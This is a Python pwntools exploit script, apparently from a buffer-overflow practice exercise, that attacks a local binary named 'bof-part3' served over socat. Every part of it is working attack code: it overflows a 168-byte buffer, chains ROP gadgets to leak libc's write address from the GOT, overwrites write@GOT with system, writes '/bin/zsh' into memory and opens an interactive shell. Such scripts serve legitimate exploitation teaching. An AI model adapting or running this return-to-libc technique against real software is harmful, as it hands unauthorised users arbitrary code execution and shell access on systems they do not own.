# originl script seen @https://stackoverflow.com/a/48571747

from pwn import *

pop3ret=0x40116a
writable=0x404029
bin=ELF("./bof-part3")
lib=ELF("/lib/x86_64-linux-gnu/libc.so.6")
# Start a forking server
server = process(['/home/kali/repo/socat', 'tcp-listen:2323,fork,reuseaddr', 'exec:./bof-part3'])

# Connect to the server
s=remote("127.0.0.1",2323)
s.recvuntil(b": ")

#leak address of write
payload=b"A"*168
payload+=p64(pop3ret)
payload+=p64(constants.STDOUT_FILENO) 
payload+=p64(bin.got[b'write']) #write@got
payload+=p64(0x8)
payload+=p64(bin.plt[b'write']) #write@plt

# part2: write system address into write got using read
payload+=p64(pop3ret)
payload+=p64(constants.STDIN_FILENO)
payload+=p64(bin.got[b'write']) #write@got
payload+=p64(0x8)
payload+=p64(bin.plt[b'read']) #read@plt

# part3: write /bin/zsh to writable address
payload+=p64(pop3ret)
payload+=p64(constants.STDIN_FILENO)
payload+=p64(writable)
payload+=p64(0x8)
payload+=p64(bin.plt[b'read'])

# part4: invoke system
payload+=p64(pop3ret)
payload+=p64(writable)
payload+=p64(0xdeadbeef)
payload+=p64(0xcafebabe)
payload+=p64(bin.plt[b'write'])

payload+=b'EOPAY'

print("[+] send payload")
s.send(payload)

s.recvuntil(b'EOPAY')
print("[+] recvd \'EOPAY\'")

got_leak=u64(s.recv(8))
print("[+] leaked write address: {}".format(hex(got_leak)))
libc_base=got_leak-lib.symbols[b'write']
system_leak=libc_base+lib.symbols[b'system']
print("[+] system: {}".format(hex(system_leak)))

s.send(p64(system_leak))
s.send(b'/bin/zsh')
s.interactive()